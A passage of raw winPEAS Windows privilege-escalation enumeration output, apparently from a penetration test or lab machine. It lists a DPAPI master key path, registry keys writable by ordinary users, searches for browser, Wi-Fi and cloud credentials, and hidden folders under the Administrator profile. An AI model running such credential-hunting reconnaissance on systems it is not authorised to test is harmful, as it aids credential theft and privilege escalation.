    Block COM Port Redirection              :
    Block Drive Redirection                 :
    Block LPT Port Redirection              :
    Block PnP Device Redirection            :
    Block Printer Redirection               :
    Allow Smart Card Redirection            :

  RDP Client Settings                                                                                                                                       
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands (T1552.002)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys (T1555.003)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    MasterKey: C:\Users\jorden\AppData\Roaming\Microsoft\Protect\S-1-5-21-3167813660-1240564177-918740779-3110\8eacd6a2-92da-46d7-86a6-dc6a4d806eaf
    Accessed: 5/15/2026 12:36:20 AM
    Modified: 5/15/2026 12:36:20 AM
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files (T1555.003)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files (T1552.001)
È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager                                                                                                                             
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets (T1558)
È  https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials (T1552.001)
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe (T1552.001)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmdexe
    AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe (T1552.001)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#scclient--sccm
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings (T1552.001)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials (T1547.005)
  [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d5353500003000000010001006e000000000000006f000000000000005800000000000000580000001600160058000000000000006f000000058a80a20a0039380000000f6ce67928f8462506795e31627c4db9834d0055004c00540049004d004100530054004500520000                           


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Registry permissions for hive exploitation (T1012,T1574.011,T1056.001) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cross-user TypingInsights key (HKCU/HKU) (T1056.001)
  [-] TypingInsights key does not grant write access to low-privileged groups.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Known HKLM descendants writable by standard users (T1574.011)
  [!] HKLM\SOFTWARE\Microsoft\DRM -> Everyone (S-1-1-0) (TakeOwnership, GenericAll)
  [!] HKLM\SOFTWARE\Microsoft\Tracing -> BUILTIN\Users (S-1-5-32-545) (GenericWrite, WriteKey)
  [!] HKLM\SOFTWARE\WOW6432Node\Microsoft\DRM -> Everyone (S-1-1-0) (TakeOwnership, GenericAll)
  [!] HKLM\SOFTWARE\WOW6432Node\Microsoft\Tracing -> BUILTIN\Users (S-1-5-32-545) (GenericWrite, WriteKey)
  [!] HKLM\SYSTEM\ControlSet001\Control\MUI\StringCacheSettings -> BUILTIN\Users (S-1-5-32-545) (GenericWrite, WriteKey)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Sample of additional writable HKLM keys (depth-limited scan) (T1574.011)
  [!] HKLM\SOFTWARE\Microsoft\AccountsControl\KnownAccounts -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\CommsAPHost\Test -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\DRM -> Everyone (S-1-1-0) (TakeOwnership, GenericAll)
  [!] HKLM\SOFTWARE\Microsoft\Enrollments -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\Enrollments\2648BF76-DA4B-409A-BFFA-6AF111C298A5 -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\Enrollments\DAD70CC2-365B-450D-A8AB-2EB23F4300CC -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\Enrollments\ValidNodePaths -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\InputMethod\Chs\DuState -> BUILTIN\Users (S-1-5-32-545) (WriteKey)
  [!] HKLM\SOFTWARE\Microsoft\InputMethod\Cht\DuState -> BUILTIN\Users (S-1-5-32-545) (WriteKey)
  [!] HKLM\SOFTWARE\Microsoft\InputMethod\en-US\DUSTATE -> BUILTIN\Users (S-1-5-32-545) (GenericWrite, WriteKey)
  [!] HKLM\SOFTWARE\Microsoft\MediaPlayer\PREFERENCES\HME -> BUILTIN\Users (S-1-5-32-545) (WriteKey)
  [!] HKLM\SOFTWARE\Microsoft\MiracastReceiver -> Authenticated Users (S-1-5-11) (SetValue)
  [!] HKLM\SOFTWARE\Microsoft\MSLicensing\Store -> BUILTIN\Users (S-1-5-32-545) (WriteKey, GenericWrite)
  [!] HKLM\SOFTWARE\Microsoft\Multimedia\TV\Tuning Spaces -> Interactive (S-1-5-4) (WriteKey)
  [!] HKLM\SOFTWARE\Microsoft\PIM -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\PIM\Contacts -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\PIM\Contacts\Settings -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\PlayToReceiver -> Authenticated Users (S-1-5-11) (SetValue)
  [!] HKLM\SOFTWARE\Microsoft\Policies -> Interactive (S-1-5-4) (WriteKey)
  [!] HKLM\SOFTWARE\Microsoft\Policies\COMMS -> Interactive (S-1-5-4) (WriteKey)
  [!] HKLM\SOFTWARE\Microsoft\Policies\DM -> Interactive (S-1-5-4) (WriteKey)
  [!] HKLM\SOFTWARE\Microsoft\PolicyManager\current -> Interactive (S-1-5-4) (WriteKey)
  [!] HKLM\SOFTWARE\Microsoft\Poom -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\Provisioning\OMADM\Accounts -> Interactive (S-1-5-4) (FullControl)
  [!] HKLM\SOFTWARE\Microsoft\Provisioning\OMADM\Sessions -> Interactive (S-1-5-4) (FullControl)
  [*] Showing up to 25 entries from the sampled paths to avoid noisy output.


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information (T1217,T1539,T1555.003) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))                                                                                
   --- End of inner exception stack trace ---                                                                                                               
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                                                                                                                        
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                                                                                                            
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()                                                                                   
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history


ÉÍÍÍÍÍÍÍÍÍÍ¹ IE history -- limit 50
                                                                                                                                                            
    http://go.microsoft.com/fwlink/p/?LinkId=255141

ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
    Not Found


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry (T1083,T1552.001,T1552.002,T1552.004,T1552.006,T1003.002,T1564.001,T1574.001,T1059.004,T1114.001,T1218,T1649) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                                                                

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ssh-keys-in-registry                                                                                                                  
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.
 (T1083)                                                                                                                                                    
    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-3167813660-1240564177-918740779-3102
   =================================================================================================

    SID: S-1-5-21-3167813660-1240564177-918740779-3107
   =================================================================================================

    SID: S-1-5-21-3167813660-1240564177-918740779-3110
   =================================================================================================

    SID: S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
   =================================================================================================

    SID: S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials (T1552.001)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files (T1552.001)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups (T1003.002)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files (T1552.001)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords (T1552.006)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds (T1552.002)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes (T1552.001)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\All Users\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml                                                                                                                                       
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Application Data\Application Data\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files
 (T1552.001)                                                                                                                                                

ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
  note: check manually if something is found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow) (T1218)
È  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files
 (T1114.001)                                                                                                                                                

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files
 (T1649,T1552.004)                                                                                                                                          

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home (T1552.001)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100-- (T1083)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50
 (T1083)                                                                                                                                                    
  Last Access Date           User                                           Application           Document

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70-- (T1083)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files (T1552.001)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)
 (T1564.001)                                                                                                                                                
     C:\Users\Administrator\AppData\Local\Application Data\History\History.IE5
     C:\Users\Administrator\AppData\Local\Application Data\History\History.IE5\MSHist012020011320200114
     C:\Users\Administrator\AppData\Local\Application Data\History\History.IE5\MSHist012020010620200113
     C:\Users\Administrator\AppData\Local\Application Data\History
     C:\Users\Administrator\AppData\Local\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Temporary Internet Files\IE
     C:\Users\Administrator\AppData\Local\Application Data\Temporary Internet Files\Low\IE
     C:\Users\Administrator\AppData\Local\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Temporary Internet Files
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\History
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                                                                                                             
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                                                                                                             
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\History
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                                                                     
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                                                                          
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                                                                 
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                                                    
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                                                                           
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                                                                           
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                                                                
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                                                   
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                                                            
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                                                        
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                                                               
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                                                               
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                                                  
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020011320200114                                                                         
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                                         
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                                              
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                                 
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                                          
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                                      
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                                             
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                                             
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5                                                                
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                            
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                        
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                    
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                           
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                           
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files                                                                            
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\Content.IE5                                                            
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Low\IE                                                                     
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\IE                                                                         
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Temporary Internet Files\Content.IE5                                                                
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History                                                                                             
     C:\Users\Administrator\AppData\Local\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\Application Data\History\History.IE5\MSHist012020010620200113                                                        
